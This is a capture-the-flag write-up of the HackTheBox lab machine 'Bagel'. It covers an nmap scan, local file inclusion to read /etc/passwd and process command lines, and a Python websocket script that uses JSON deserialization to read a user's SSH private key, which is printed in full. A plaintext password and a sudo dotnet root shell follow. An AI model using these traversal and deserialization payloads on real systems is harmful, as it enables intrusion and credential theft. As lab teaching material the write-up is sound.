# Introduction
Bagel is a medium level machine on HackTheBox which is a great box to learn about JSON # deserialization and how to exploit LFI to gain access to the machine
# Initial scan
First we start an NMAP scan to find all open ports on the machine and I found 3 ports which are `22,5000,8000` and port 8000 redirects us to `bagel.htb` domain so we add it to `/etc/hosts` file
```bash
┌──(kali㉿kali)-[~/HTB/bagel]
└─$ nmap -sC -sV 10.10.11.201
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 12:58 EDT
Nmap scan report for 10.10.11.201
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey: 
|   256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA)
|_  256 80a7cd10e72fdb958b869b1b20652a98 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Mon, 29 May 2023 16:59:19 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Mon, 29 May 2023 16:59:36 GMT
|     Connection: close
|   Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Mon, 29 May 2023 16:59:47 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (parts).)</h1>
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Mon, 29 May 2023 16:59:20 GMT
|     Content-Length: 54
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (version).)</h1>
|   SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Mon, 29 May 2023 16:59:48 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (parts).)</h1>
|   TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Mon, 29 May 2023 16:59:49 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|_    <h1>Bad Request (Invalid request line (parts).)</h1>
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Mon, 29 May 2023 16:59:20 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Mon, 29 May 2023 16:59:14 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 263
|     Location: http://bagel.htb:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</a>.
```
and we open the website on port 8000 because it won't work on other ports and a website appears
![image](img/1.png)
and we notice that there is a page parameter in the URL and it name of a file so we try LFI and it worked and we know from the /etc/passwd file that there are 2 users who are phil and devloper
![image](img/2.png)
We tried trying to get interesting files without success, like the _id_rsa_ or some log file. We tried fuzzing _active_ system processes using a small one liner.
```bash
┌──(kali㉿kali)-[~/HTB/bagel]
└─$  for i in $(seq 900 1000); do curl bagel.htb:8000/?page=../../../../proc/$i/cmdline -o -; echo "  PID => $i"; done
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 923
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 925
```
so we found some interesting processes pointing to a dll file with the name of bagel.dll so we download the file using LFI we found earlier and by using dnspy we found a password for the username developer but it didn't work on SSH but we found a way to inject json serialized data
![imag](Bagel/img/3.png)
# Initial foothold
so we create a python script to connect to the websocket on the machine and to inject serialized JSON data to be able to read the ssh key for phil user
```python
#!/usr/bin/python3 
import websocket,json 
ws = websocket.WebSocket() 
ws.connect("ws://bagel.htb:5000/") 
order = {"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../../../../home/phil/.ssh/id_rsa" }} 
data = str(json.dumps(order)) 
ws.send(data) 
result = ws.recv() 
print(result)
```
and we get the following results
```json
┌──(kali㉿kali)-[~/HTB/bagel]
└─$ python3 script.py
{
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "11:44:45",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
    "ReadFile": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----",
    "WriteFile": null
  },
  "WriteOrder": null,
  "ReadOrder": null
}
```
so we save the key in a file and give the right permissions
```bash
┌──(kali㉿kali)-[~/HTB/bagel]
└─$ chmod 600 rsa_key
┌──(kali㉿kali)-[~/HTB/bagel]
└─$ ssh phil@bagel.htb -i rsa_key
Last login: Tue Feb 14 11:47:33 2023 from 10.10.14.19
[phil@bagel ~]$
```
and we are able to retrieve the user.txt flag after that we try to login as developer using the password we got earlier *developer:k8wdAYYKyhnjg3K*
```bash
[phil@bagel ~]$ su developer
Password: 
[developer@bagel phil]$ 
```
# Privilege Escalation
we run sudo -l do see our permissions and we got the following
```
[developer@bagel phil]$ sudo -l
Matching Defaults entries for developer on bagel:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME
    LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```
so we can run dotnet as admin so we go to [gtfiobin](https://gtfobins.github.io/gtfobins/dotnet/#sudo) and we get root
```bash
[developer@bagel phil]$ sudo dotnet fsi
>System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
sh-5.2# id 
uid=0(root) gid=0(root) groups=0(root)
```

# VOILA
